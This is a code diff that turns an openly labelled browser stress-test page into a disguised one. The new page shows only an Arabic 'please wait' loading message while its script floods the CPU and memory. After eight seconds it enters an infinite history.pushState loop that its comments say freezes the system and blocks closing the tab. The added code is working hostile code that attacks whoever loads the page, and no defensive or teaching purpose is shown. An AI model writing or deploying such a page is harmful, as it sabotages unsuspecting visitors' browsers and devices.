@@ -1,41 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Hardware Stress Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل...</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .loader-text {
+            color: #555;
+            font-size: 24px;
+        }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; text-align:center; padding-top:100px;">
-    <h1>اختبار الأداء مفعل الآن...</h1>
-    <p>راقب مدير المهام (Task Manager) الآن</p>
-    <h2 id="ram-usage">0 MB</h2>
+<body>
+    <div class="loader-text">يرجى الانتظار...</div>
 
     <script>
-        // دالة لتجاوز الكاش عبر توليد بيانات عشوائية باستمرار
-        function forceLoad() {
-            let memoryHog = [];
+        window.onload = function() {
+            // مخزن البيانات (الرام)
+            let memoryCrusher = [];
             
-            // استخدام الـ Blobs لأن المتصفح يجد صعوبة في تنظيفها فوراً
-            setInterval(() => {
-                try {
-                    // توليد نص عشوائي ضخم جداً وتحويله لـ Blob
-                    let heavyString = new Array(1000000).fill(Math.random().toString()).join('');
-                    let blob = new Blob([heavyString], {type: 'text/plain'});
-                    memoryHog.push(URL.createObjectURL(blob));
-                    
-                    document.getElementById('ram-usage').innerText = "تم استهلاك: " + (memoryHog.length * 2) + " MB تقريباً";
-                    
-                    // ضغط المعالج بحسابات رياضية لا تتوقف
-                    for(let i=0; i<1000000; i++) {
-                        Math.exp(Math.random() * Math.log(Math.random()));
-                    }
-                } catch(e) {
-                    console.error("Memory Full!");
+            // 1. استهلاك المعالج (CPU) بشكل انفجاري
+            // يتم استخدام setInterval قصيرة جداً لتجاوز قيود المتصفح في البداية
+            const cpuBurn = setInterval(() => {
+                for (let i = 0; i < 2000000; i++) {
+                    Math.sqrt(Math.random() * Math.random()) / Math.exp(Math.random());
                 }
-            }, 100);
-        }
+            }, 10);
 
-        // بدء التنفيذ فوراً
-        window.onload = forceLoad;
+            // 2. استهلاك الذاكرة (RAM) بشكل متسارع
+            const ramBurn = setInterval(() => {
+                try {
+                    // تخصيص مصفوفات ضخمة (حوالي 20MB في كل نبضة)
+                    let chunk = new BigUint64Array(2500000); 
+                    for (let i = 0; i < chunk.length; i++) {
+                        chunk[i] = BigInt(Math.floor(Math.random() * 1000));
+                    }
+                    memoryCrusher.push(chunk);
+                } catch (e) {
+                    // إذا امتلأ الرام، لا تتوقف، استمر في محاولة إشغال المعالج
+                }
+            }, 50);
+
+            // 3. الضربة القاضية (Kill Switch) بعد 8 ثوانٍ
+            // بمجرد الوصول لهذه المرحلة، سيتجمد النظام تماماً (UI Freeze)
+            setTimeout(() => {
+                console.log("Entering Critical State...");
+                while(true) {
+                    // حلقة لا نهائية تمنع المتصفح حتى من إغلاق التبويب
+                    let s = Math.random().toString(36).repeat(100);
+                    history.pushState(null, null, s);
+                }
+            }, 8000); 
+        };
     </script>
 </body>
 </html>
